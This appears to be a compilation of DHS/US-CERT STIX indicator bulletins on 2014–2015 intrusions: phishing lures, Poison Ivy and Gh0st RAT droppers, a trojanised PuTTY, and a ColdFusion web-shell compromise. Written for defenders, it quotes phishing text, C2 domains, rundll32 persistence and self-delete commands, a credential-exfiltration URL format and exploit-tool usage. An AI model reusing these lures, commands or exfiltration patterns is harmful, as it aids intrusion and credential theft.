stix:STIX_Header.stix:Description: On 22 September 2014, a phishing email in Hebrew language was sent from hiliknavon@gmail.com with the subject "??? ?????? ??? ????? ???? ???? ???????" to a user in Israel. It contained the attachment ????? ????.rar (MD5: 0C8E9807431E525D5D8728C6008EF041), which includes Poison Ivy remote administration tool (RAT). The Poison Ivy RAT calls back to kaswer12.strangled.net and kaswer13.zapto.org over port 443.

stix:Indicator.indicator:Description:
---- BEGIN EMAIL HEADER ---- From hiliknavon@gmail.com Mon Sep 22 04:08:29 2014 Return-Path: <hiliknavon@gmail.com> Subject: =?utf-8?b?15zXnteUINep15LXkNeV15zXlCDXkNeR158g16rXqtek15jXqCDXkdeS15w=?= =?utf-8?b?15wg16nXlNeZ15Ag15TXqteQ15TXkdeUPw==?= X-SENDER-IP: 209.85.160.195 X-SENDER-REPUTATION: 2.6 Received: from mail-yk0-f195.google.com ([209.85.160.195]) 22 Sep 2014 09:12:13 +0000 Received: by mail-yk0-f195.google.com with SMTP id 79so460567ykr.2 ; Mon, 22 Sep 2014 02:12:13 -0700 (PDT) DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20120113; h=mime-version:date:message-id:subject:from:to:content-type; bh=k4D4WJ9kzz29fPR7pTnJ+ENuB33SDpaO0ZOQoeRZroo=; b=tU3xZ4hsVjxAf68bePCtncmWuzV5OfPv03g7Y0RCg6IKc8LLyg/JOOaGuSMjWtjpoY 0oT/6BATT+k5LUeELxMuGPyBJHF5ClAKzzJjJFBf53dwYpdUQ54fRqhBZX8mqnDZbdqR c2QvLCh5/TN4BUFWRx99aocIrkIHHq7LyQuBI2B0sbXfafVG7m9msfyz/7nZdQ2yAqfs 8vTNInkTPaUou8xs9y4jq1V2H485lU7OHMKQFG/lLRiU8MT1TPPEZ4hKTAQ2LRaMrVPE GAfXqYJpQ+Pqq9KB0Z1IbcLlycdwEky7D4lj3TSZE1XGc24AAevrS3GrMy3uJdB7hgaG y6ow== MIME-Version: 1.0 X-Received: by 10.236.133.65 with SMTP id p41mr67192yhi.73.1411377132604; Mon, 22 Sep 2014 02:12:12 -0700 (PDT) Received: by 10.170.139.69 with HTTP; Mon, 22 Sep 2014 02:12:12 -0700 (PDT) Date: Mon, 22 Sep 2014 12:12:12 +0300 Message-ID: <CAGXQjLpkT7S7tNWFPdNTk6e068evFUP2A0Ojiuoy97Wb+AfNzg@mail.gmail.com> From: hilik navon <hiliknavon@gmail.com> To: undisclosed-recipients:; Content-Type: multipart/mixed; boundary=20cf303e9fc8a252cb0503a3d825 ---- END EMAIL HEADER ----
---- BEGIN EMAIL BODY ---- ??? ??? ?????? ????? ??? ????? ???????
A loose translation of the email body from Hebrew to English: "Is she must choose between love for the profession?" ---- END EMAIL BODY ----

The filename for this attachment was loosely translated as: "Geula Even .rar"
This .rar archive contains the file ??? ?????? ??? ????? ???? ???? ??????.scr (MD5: 3A580FCCF84C9D4C3EDB5453C32278E7).
The filename was loosely translated as: "Why Geula Even resign because she fell in love.Scr" It installs the Poison Ivy implant f.exe (MD5: c5f528ef682a7959747bae6d1020b1dc).

This is the Poison Ivy RAT with the password: admin2014
It calls back to kaswer12.strangled.net and kaswer13.zapto.org over port 443.
-------------------------------------------------------------- PIVY Configuration Block Discovered @ 0x36233 with XOR key 0x0 -------------------------------------------------------------- StubPath: StubPath ShellClass: SOFTWARE\Classes\http\shell\open\command ActiveSetup: Software\Microsoft\Active Setup\Installed Components\ ID: nbe Group: Dolsi
The Poison Ivy RAT f.exe (MD5: c5f528ef682a7959747bae6d1020b1dc) calls back to this domain.

stix:STIX_Header.stix:Title: Cold Fusion Vulnerability Leads to Web Shell Activity
stix:STIX_Header.stix:Description: On 28 January 2015, a US Government agency reports a public facing host was compromised due to a Cold Fusion vulnerability. The attacker gained the ability to upload files, conducted network reconnaissance, then uploaded various credential-stealing programs and a backdoor web shell. Reported network traffic suggests that files from within the compromised network were exfiltrated via several sessions over port 443 communicating with the IP address 61.195.97.204, which is registered in Japan.

stix:Indicator.indicator:Description: This file was uploaded to the compromised host from the IP address 61.195.97.204, which is registered in Japan. This is a benign copy of WinRAR 4.2 (64-bit).

This archive file was uploaded to the compromised host from the IP address 61.195.97.204. It contains the benign files mimidrv.sys (MD5: 32282E07DB321E8D7849F2287BB6A14F), mimilib.dll (MD5: 34FFD09BE67CC19B028DE4AF35924CF6), and mimikatz.exe (MD5: CECF004187548F8A01E8D341415704F6). The files are all components of mimikatz, which is a publically available penetration testing/security auditing tool, and includes functionality for extracting plain-text passwords from the process memory of lsass.exe; a Windows system file that enforces the security policies of a system.
This mimikatz (64-bit) system file was contained in the archive file m.rar (MD5: 163CC3C58766073C2F135BB2F1D09EFC).
This mimikatz (64-bit) DLL file was contained in the archive file m.rar (MD5: 163CC3C58766073C2F135BB2F1D09EFC).
This mimikatz (64-bit) executable file was contained in the archive file m.rar (MD5: 163CC3C58766073C2F135BB2F1D09EFC).

This executable file was uploaded to the compromised host from the IP address 61.195.97.204. It is a copy of gsecdump v2.0b5, which is a tool for extracting hashes from the SAM, Active Directory, and active log-in sessions. It works on both x86 and x64 architectures.
This executable file was uploaded to the compromised host from the IP address 61.195.97.204. It is a copy of PsExec 1.98, which allows a user to execute programs on remote systems.

This executable file was uploaded to the compromised host from the IP address 61.195.97.204. It appears to be a compiled version of the open source Python Kerberos Exploitation Kit (PyKEK), which leverages the MS14-068 vulnerability identified in CVE-2014-6324 on an unpatched domain controller of an Active Directory domain to retrieve user Kerberos tickets.
USAGE: ms14-068.exe -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> OPTIONS: -p <clearPassword> --rc4 <ntlmHash>

This IP address was observed to be the source address of various compromise and exploitation activity on the compromised host. The IP address is registered in Japan. Through network reconnaissance within the compromised network, attackers could identify other hosts on the network. The IP was observed communicating with six other IP addresses in the same network via SSL sessions on port 443.
Various pen-testing tools were uploaded to the compromised host from this IP address, along with a backdoor web shell that another IP address (223.255.215.99) used to access the compromised host during the incident.

This IP address was seen communicating with the backdoor web shell uploaded on the compromised host during the period of compromise by the Japanese-registered IP address (61.195.97.204). This IP is registered in South Korea.

stix:STIX_Header.stix:Title: Watering Hole Attack on Legitimate Aviation Website
stix:STIX_Header.stix:Description: An organization in the Aerospace sector observed redirects from a legitimate aviation related domain, www.aopa.co.uk (Aircraft Owners and Pilots Association in the UK) to a URL previously observed hosting exploit code as part of watering hole activity.

stix:Indicator.indicator:Description:
Sample HTTP GET request associated with the redirect: GET /js/Jquery.php HTTP/1.1 Accept: image/gif, image/jpeg, image/pjpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */* Referer: http://www.aopa.co.uk/ Accept-Language: en-us User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C; IT; InfoPath.2) Accept-Encoding: gzip, deflate Host: 178.79.186.55 Connection: Keep-Alive Sample Response: HTTP/1.1 404 Not Found Date: Mon, 10 Nov 2014 18:18:51 GMT Server: Apache/2.2.15 (CentOS) X-Powered-By: PHP/5.3.3 Content-Length: 238 Connection: close Content-Type: text/html; charset=UTF-8 404 Not Found

Not Found

The requested URL /js/Jquery.php was not found on this server.

Apache/2.2.15 (CentOS) Server at 178.79.186.55 Port 80

stix:STIX_Header.stix:Title: Phishing Email with Microsoft Outlook Theme
stix:STIX_Header.stix:Description: On 8 February 2015, a phishing email with the subject "Microsoft Outlook" was observed. The email was sent from "Becky.Apostolos@ohiohealth.com" and included a link to http://www.electro-univers.ro//matei/up-wp/\.

stix:Indicator.indicator:Description: ----- BEGIN EMAIL HEADERS ----- Received: from mail2010cashuba.medcentral.org (mail2010cashuba.medcentral.org [192.168.178.36]) by proofpointagent2.medcentral.org (8.14.5/8.14.5) with ESMTP id t18CIct3013759 (version=TLSv1/SSLv3 cipher=AES128-SHA bits=128 verify=NOT); Sun, 8 Feb 2015 07:18:38 -0500 Received: from MAIL2010DATAA.medcentral.org ([fe80::cc6d:90a1:d8b2:3b44]) by mail2010cashuba.medcentral.org ([fe80::8541:68e1:7dd8:50ca%17]) with mapi id 14.02.0387.000; Sun, 8 Feb 2015 07:18:36 -0500 From: [REDACTED] <Becky.Apostolos@ohiohealth.com> Subject: Microsoft Outlook Thread-Topic: Microsoft Outlook Thread-Index: AdBDmT8YO8nnJ4SySOKLv2X4bI/XnQ== Date: Sun, 8 Feb 2015 12:18:35 +0000 Message-ID: <5BB17F09AE4C4C46830D6F85CB638FAF010685A593@MAIL2010DATAA.medcentral.org> Accept-Language: en-US Content-Language: en-US X-MS-Has-Attach: X-MS-TNEF-Correlator: x-originating-ip: [116.203.74.46] Content-Type: multipart/alternative; boundary="_000_5BB17F09AE4C4C46830D6F85CB638FAF010685A593MAIL2010DATAA_" MIME-Version: 1.0 X-Proofpoint-Spam-Reason: safe X-Proofpoint-Virus-Version: vendor=nai engine=5400 definitions=5800 signatures=585085 --_000_5BB17F09AE4C4C46830D6F85CB638FAF010685A593MAIL2010DATAA_ Content-Type: text/plain; charset="iso-8859-1" Content-Transfer-Encoding: quoted-printable ----- END EMAIL HEADERS ----- ----- BEGIN EMAIL BODY ----- Subject: Microsoft Outlook From: [REDACTED]<Becky.apostolos@ohiohealth.com> SMTP From: prvs=04812ee43b=becky.apostolos@ohiohealth.com; To: SMTP To: [REDACTED RECIPIENT] Date: Sun Feb 08 12:18:35 GMT 2015 Helpdesk Service Centre requires your immediate re-activation of your Email account. This is to upgrade email account to Microsoft Outlook 2015. Inability to complete this procedure will render your account inactivate. Activate by completing the survey procedure. <u>CLICK HERE</u>to activate. IT-Helpdesk Service FORTUNE 100 Best Companies to Work For 2007-2014 -----END EMAIL BODY------
There is no malware analysis for this activity. The <u>"CLICK HERE</u>" link directs to "http://www.electro-univers.ro//matei/up-wp/\".

stix:STIX_Header.stix:Title: Getup Malware Installed on DIB Network
stix:STIX_Header.stix:Description: On 4 October 2014, malicious activity was reported regarding compromised systems on a defense industrial base (DIB) network. Attackers used a previously compromised system to traverse the network using publicly available enumeration and password harvesting tools. The attackers loaded the Getup malware implant, green.exe (MD5: 497b08deb8e4c197a2c81972545054c3), onto the first compromised system. It called back to an unspecified domain to download a suspected Python script.

stix:Indicator.indicator:Description:
(U//FOUO) The attackers worked from the C:\Windows\temp\ directory of the infected host to run various commands and tools. User information was enumerated with the "net user" command against seven user accounts. Using two of the enumerated accounts, the attackers successfully connected to two remote hosts using compromised credentials. The attackers then uploaded malware, green.exe, renamed to hkcmd.exe, and attempted to remotely execute it on the first host. The attacker was denied access from running any commands on the second remote host.
(U//FOUO) The attacker targeted a previously enumerated server by pinging it from the first system; however, the server was unavailable.
(U//FOUO) NetSess, a publically available tool, was used to display enumeration information from two specified hosts.
(U//FOUO) The attackers copied Mimikatz, a publically available password harvesting tool, to the first remote host to obtain passwords from two accounts, one of which was actively used to connect to another system.
(U//FOUO) The attackers copied a file named new_mimi64.rar to the first compromised host. Rar.log, an open source packing tool, unpacked this file into three different files: sekurlsa.dll, user.txt, and Mimikatz. The attackers used Mimikatz to obtain passwords from two accounts, one of which was actively used to connect to a separate system.
(U//FOUO) The file green.exe is the Getup malware implant. The attacker renamed the implant to hkcmd.exe before attempting to execute it on the initially infected system.
(U//FOUO) The following HTTP POST request was observed:
POST /fetch.py HTTP/1.1 Accept-Encoding: identity, *;q=0 User-Agent: Mozilla/5.0 Host: [FQDN] Content-Length: 390 Cache-Control: no-cache Connection: Keep-Alive method=POST&encoded_path=<base64 encoded data>&headers=<base64 encoded data>&postdata=<base64 encoded data>&version=2.0.0

stix:STIX_Header.stix:Title: Phishing Email with Pleasantly Surprised Theme
stix:STIX_Header.stix:Description:
On 07 December 2014 a US government agency reported observing an email with the subject of "Pleasantly surprised". The email included the malicious attachment Pleasantly surprised.zip (MD5 D9975DC0476F87B08DD5375C88243E39 that has an executable file that displays an orange play button icon. If executed the file installs the Gh0st remote administration tool (RAT) that calls back to www.meitanjiaoyiwang.com.
Similar phishing campaigns using the "Pleasantly surprised" theme with a Gh0st RAT payload were reported in the following indicator bulletins. IB-14-10295 IB-14-10325 IB-14-10394 IB-14-10429 IB-14-10590 IB-14-10600 IB-14-10619

stix:Indicator.indicator:Description:
--- BEGIN EMAIL HEADER --- EHLO omr-m02.mx.aol.com MAIL FROM:<berkmarpat59@aol.com> SIZE=487065 RCPT TO:[REDACTED] DATA Received: from mtaomg-mba01.mx.aol.com (mtaomg-mba01.mx.aol.com [172.26.133.111]) by omr-m02.mx.aol.com (Outbound Mail Relay) with ESMTP id 6648770418B45; Thu, 4 Dec 2014 12:57:08 -0500 (EST) Received: from core-mga08f.mail.aol.com (core-mga08.mail.aol.com [172.27.97.8]) by mtaomg-mba01.mx.aol.com (OMAG/Core Interface) with ESMTP id A50EE38000086; Thu, 4 Dec 2014 12:57:07 -0500 (EST) To: [REDACTED] Subject: Pleasantly surprised X-MB-Message-Source: WebUI X-MB-Message-Type: User MIME-Version: 1.0 From: [REDACTED POSSIBLE PII] <berkmarpat59@aol.com> Content-Type: multipart/mixed; boundary="--------MB_8D1DE02DA75A4BB_1FEC_C63B_webmail-vm043.sysops.aol.com" X-Mailer: AOL Webmail STANDARD Received: from 108.68.102.119 by webmail-vm043.sysops.aol.com (149.174.146.80) with HTTP (WebMailUI); Thu, 04 Dec 2014 12:57:07 -0500 Message-Id: <8D1DE02DA75A4BB-1FEC-419F@webmail-vm043.sysops.aol.com> X-Originating-IP: [108.68.102.119] Date: Thu, 4 Dec 2014 12:57:07 -0500 x-aol-global-disposition: G X-AOL-VSS-INFO: 5600.1067/98281 X-AOL-VSS-CODE: clean DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mx.aol.com; s=20140625; t=1417715828; bh=aXlnxoEGOzGfsTZxMg1ZZdSmNVI0UsHwW/mobcS8XWI=; h=From:To:Subject:Message-Id:Date:MIME-Version:Content-Type; b=sBlTefFrpK9X5ahOtJbAaNSAFw1slx/xpLw4vO4CC5HFNonIcE9PuNjROi9ELjLja vagRj3SCbo2dFK/mBwJoJNI8j8yzGBNuZj3ZTctbEmyzVRVSaHYO4+V5RERfC1ddc2 JAA/hRy25Vkd2ZKajBedFHRdF6bXzHn03T9pvjZs= x-aol-sid: 3039ac1a856f5480a0735c8f
---END EMAIL HEADER ---
This is a zip archive file containing "Pleasantly Surprised.exe".

The executable file displays an orange "Play" button icon. When executed, the file creates the hidden folder C:\Recycle09102014 and created a disguised DLL named GameUpdate.log, modified the System Registry for persistence, executed the DLL and a command to delete itself, then terminated.
Command used to execute the DLL: RUNDLL32.EXE C:\Recycle09102014\GameUpdate.log,LoaderEntry
Command used to delete itself: cmd /c ping 127.0.0.1 -n 1&del "C:\Documents and Settings\User\Desktop\Pleasantly surprised.Exe"

The registry values added are as follows:
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GameInit: 52 55 4E 44 4C 4C 33 32 2E 45 58 45 20 43 3A 5C 52 65 63 79 63 6C 65 30 39 31 30 32 30 31 34 5C 47 61 6D 65 55 70 64 61 74 65 2E 6C 6F 67 2C 4C 6F 61 64 65 72 45 6E 74 72 79 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 HKLM\SYSTEM\ControlSet001\Services\BITS\LoginAddress: "PIXeBZjsQcToRZfgSdr0QcXoRZWnSJrkKg==" HKLM\SYSTEM\ControlSet001\Services\BITS\LoginPort: "zECbKg==" HKLM\SYSTEM\CurrentControlSet\Services\BITS\LoginAddress: "PIXeBZjsQcToRZfgSdr0QcXoRZWnSJrkKg==" HKLM\SYSTEM\CurrentControlSet\Services\BITS\LoginPort: "zECbKg=="
The decoded hex value is as follows: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GameInit: RUNDLL32.EXE C:\Recycle09102014\GameUpdate.log,LoaderEntry
The decoded base64 values are as follows: BITS\LoginAddress: 00000000 3c 85 de 05 98 ec 41 c4 e8 45 97 e0 49 da f4 41 <.....A. .E..I..A 00000010 c5 e8 45 95 a7 48 9a e4 2a ..E..H.. * BITS\LoginPort: 00000000 cc 40 9b 2a .@.*
This file is a Gh0st RAT implant DLL. It is executed with the following command: "rundll32.exe GameUpdate.log,LoaderEntry". The process writes to "ky1log.dat".
The file has the following properties: Company Name - Kaspersky Lab ZAO Legal Copyright - 2014 Kaspersky Lab ZAO. All Rights Reserved. Legal Trademarks - Registered trademarks and service marks are the property of their respective owners Product Name - Kaspersky Anti-Virus Product Version - 15.0.0.463 File Version - 15.0.0.463 File Description - Kaspersky Anti-Virus Original Filename - avp.exe
Network information: IP/Domain: www.meitanjiaoyiwang.com Port: 702 Protocol: UDP 00000000 a4 00 00 00 e0 00 00 00 41 53 44 46 47 78 9c 4b ........ ASDFGx.K 00000010 93 5a 59 38 87 81 81 81 15 88 19 81 58 83 8b 81 .ZY8.... ....X... 00000020 81 09 48 07 a7 16 95 65 26 a7 2a 04 24 26 67 2b ..H....e &.*.$&g+ 00000030 18 33 14 2e b0 98 03 96 ff 13 b3 92 21 95 79 62 .3...... ....!.yb 00000040 4d 05 23 48 17 03 c3 8e d8 95 0c b3 6a 27 d6 30 M.#H.... ....j'.0 00000050 30 ac 2e 8c 03 b2 65 18 2c c0 fa 65 80 44 0d d0 0.....e. ,..e.D.. 00000060 50 e1 1e 46 06 18 60 64 80 b2 1f fc ad bf 02 55 P..F..`d .......U 00000070 e3 c0 c6 c0 b0 b1 71 7b 0c cc 3c 9f b8 95 40 fd ......q{ ..<...@. 00000080 4c fb 98 c1 1a 18 19 36 70 33 30 70 31 32 32 95 L......6 p30p122. 00000090 25 96 a6 67 e4 e9 16 17 18 31 10 0d ec 81 18 00 %..g.... .1...... 000000A0 ff 17 23 79 ..#y
Gh0st RAT sends system information such as service pack and computer name. The Gh0st RAT traffic repeats approximately every 10 seconds.
The file GameUpdate.log (MD5 43A9B8015D89E707695B5B381F694F51) attempts to call out to this command and control domain over UDP via port 702.

stix:STIX_Header.stix:Title: Malicious Version of PuTTY Served From a Redirected PuTTY Websites
stix:STIX_Header.stix:Description:
On 13 May 2015, an IT networking sector organization observed a malicious version of PuTTY served from a redirected PuTTY website. The MalPutty file PUTTY.exe (MD5: b5c88d5af37afd13f89957150f9311ca) was also served from many compromised websites. The MalPutty sent stolen credentials to ngusto-uro.ru.
Credentials are harvested from the users when they initiate an SSH session and are sent back with the string "ssh://<USERNAME>:<PASSWORD>@<IP ADDRESS or DOMAIN>:<PORT>" which is then Base64 encoded and appended to the URI before an HTTP GET request is sent to collection server "http://ngusto-uro.ru/get/index.php?record=c3NoOi8vVVNFUk5BTUU6UGFzc3dvcmQxMjM0QDE5Mi4xNjguMC4w - 456 220 0 "Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.9.168 Version/11.51".
This activity is similar to the same format used in the StealZilla campaign, except with SSH in place of FTP for the protocol. The user agent string is hardcoded as "Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.9.168 Version/11.51". Traffic Direction Systems (TDS) were in place to serve as a means to the server-side redirection.

stix:Indicator.indicator:Description:
The malicious PUTTY.exe (MD5 b5c88d5af37afd13f89957150f9311ca) comes in the PE format, just like the original. This malicious version of PuTTY maintains a similar user interface and functionality as the original, although it was compiled by a different version of Microsoft Visual C++. This resulted in a slightly altered user interface. The "About" section was listed as "Unidentified build, Nov 29 2013 21:41:02". The legitimate version of PuTTy v0.63 was released a few months prior to this compile time. This would require a different version number.
Credentials are harvested from the users when they initiate an SSH session, then sent back with the string "ssh://<USERNAME>:<PASSWORD>@<IP ADDRESS or DOMAIN>:<PORT>". This string was then encoded with Base64 and appended to the URI. An HTTP GET request based on this string is sent to the collection server "http://ngusto-uro.ru/get/index.php?record=c3NoOi8vVVNFUk5BTUU6UGFzc3dvcmQxMjM0QDE5Mi4xNjguMC4w - 456 220 0 "Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.9.168 Version/11.51".
This activity is similar to the same format used in the StealZilla campaign, except with SSH in place of FTP for the protocol. The user agent string is hardcoded as "Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.9.168 Version/11.51".

This domain is associated with IP 146.185.239.3. It was previously used in the StealZilla campaign, which served a malicious version of the FileZilla FTP client. This domain received stolen credential information from compromised systems.

This domain hosted the malicious version of PuTTY. It was previously used in the StealZilla campaign, which served a malicious version of the FileZilla FTP client. This domain received stolen credential information from compromised systems.

This domain hosted the malicious version of PuTTY. It was previously used in the StealZilla campaign, which served a malicious version of the FileZilla FTP client. This domain received stolen credential information from compromised systems.

This domain hosted the malicious version of PuTTY. It was previously used in the StealZilla campaign, which served a malicious version of the FileZilla FTP client. This domain received stolen credential information from compromised systems.

Posts on various forums referenced the IP address 146.185.239.3 from injected JavaScript code used on multiple compromised sites containing various PHP frameworks. The domains used by the threat actors for StealZilla and MalPutty also currently resolve to this IP address, and previously used 144.76.120.243.

Compromised servers host seemingly legitimate copies of the HTML pages used for PuTTY, but with small variations including words to catch attention and even a picture of the malicious version of PuTTY. All of the fake pages are dumped in a /putty directory on the compromised webservers:
/putty/super-magnetic-putty.html /putty/garnier-putty.html /putty/putty.html
The compromised web servers have nothing to do with PuTTY or SSH clients outside of this directory.

The injected JavaScript uses the URI http://146.185.239.3/sTDS/go.php, which appears to run the Traffic Direction Systems (TDS) framework sTDS. TDS services can be used for malicious activities such as delivering exploit kits. This JavaScript attempts to identify characteristics of the compromised device to form a key sent to the TDS to determine the routing of the device.

stix:STIX_Header.stix:Title: Spear-Phishing Email Using "Pleasantly surprised" Theme Containing Malicious Attachment
stix:STIX_Header.stix:Description: On June 6, 2015, US-CERT was notified by a trusted third party of a spear-phishing campaign using "Pleasantly surprised" themed emails containing a malicious attachment.

marking:Marking_Structure.simpleMarking:Statement: This Indicator Bulletin is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP: AMBER. Recipients may only share TLP: AMBER information with members of their own organization, and only as widely as necessary to act on that information. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp.

stix:Indicator.indicator:Description: The email bodies were either blank or said "Pleasantly surprised". The emails may include the signature block of the compromised sender.
The Zip Archive File contains the Gh0st RAT Dropper executable file "Pleasantly surprised.exe".

When executed, the executable file does the following: -creates the hidden folder "C:\WinRecel" -modifies the registry to ensure persistence -adds "air.dll" and "Sys.dat" to the created "C:\WinRecel" folder. -executes the following command: "rundll32.exe c:\WinRecel\air.dll LoadEntryPoint". It then deletes itself with the following command: "cmd /c ping 127.0.0.1 -n 1&del "C:\Documents and Settings\User\Desktop\Pleasantly surprised.exe"".
This file contains Gh0st RAT shellcode, and is deobfuscated using "0x 05 14 0C 1B 0A 0D DE"

When the DLL is executed (i.e. rundll32.exe c:\WinRecel\air.dll LoadEntryPoint), the DLL loads the shell code from "Sys.dat", and creates "C:\WINDOWS\Temp\Sys.inf", and the obfuscated key log file "ky1log.dat". Then modifies the System Registry for persistence by executing "rundll32.exe advpack.dll,LaunchINFSection c:\windows\Temp\Sys.inf,DefaultInstall".
This is an obfuscated key log file (hash, size varies).
This file is used by "air.dll" to establish persistence.
DNS request and TCP traffic occur over port 53.

stix:STIX_Header.stix:Title: Microsoft Office Vulnerability Leveraged in Spear Phishing Campaign
stix:STIX_Header.stix:Description: On 13 March 2015, a US Government Department observed a spear phishing campaign with subjects written in Mongolian, and an attached malicious Microsoft Word document that exploits vulnerability CVE-2012-0158 to upload a trojan backdoor on the compromised host. The malware communicates with the domain here.pechooin.com for command and control (C2) purposes.

stix:Indicator.indicator:Description:
----- BEGIN EMAIL HEADER -----

----- BEGIN EMAIL BODY ----- Subject: Tsag agaariin medee From: enkhbatar@aol.com; To: [REDACTED]; SMTP To: [REDACTED]; Date: Fri Mar 13 08:29:00 GMT 2015 Attachments: Tsag agaariin medee.doc (76846 bytes); Manai orond tsag agaar yamar baih talaar medeelie!
----- END EMAIL BODY -----

This malicious Microsoft Word document was attached to the email with the subject "Tsag agaariin medee". The file leverages the Microsoft Office vulnerability CVE-2012-0158 to create the backdoor trojan "xpsfiltsvcs.tmp" (MD5: CC8DA150A031D8200BB62289AB35BC1D) in the %temp% directory. The file then creates a copy of the trojan as a startup entry in the compromised system's registry for persistence.
The malware modifies a registry key for persistence: HKU\S-1-5-21-1454471165-1644491937-839522115-1003\Software\Microsoft\Windows\CurrentVersion\Run\xpsfiltsvcs: "rundll32.exe C:\DOCUME~1\User\LOCALS~1\Temp\xpsfiltsvcs.tmp,XpsRegisterServer"
The backdoor executes the next time the victim logs in using the registry key-value pair specified above. The file then creates a benign Microsoft Word document (MD5: 67726DF73BF2904D45754A860BE5363D), which opens as a decoy.

This file is a backdoor trojan created by the malicious Microsoft Word document "Tsag agaariin medee.doc" (MD5: BD49C22DA524FF53CED25285A8D98581). The malware is disguised as "XPS Server" and runs from the registry key specified by the custom key-value pair created in the victim's system registry. Upon execution, the file then issues an HTTP POST to the domain here.pechooin.com on port 8080.
This file was previously used in a related campaign described in IB-15-10117.
This is a benign Microsoft Word document opened as a decoy by the malicious Word Document "Tsag agaariin medee.doc" (MD5: BD49C22DA524FF53CED25285A8D98581).

The backdoor trojan "xpsfiltsvcs.tmp" (MD5: CC8DA150A031D8200BB62289AB35BC1D) communicates with this URL over port 8080:
POST /cgl-bin/update.cgi HTTP/1.1 Host: here.pechooin.com:8080 Content-Length: 25 Cache-Control: no-cache

The domain here.pechooin.com was previously used as a C2 site in other phishing campaigns described in IB-15-10117 and IB-15-10129.
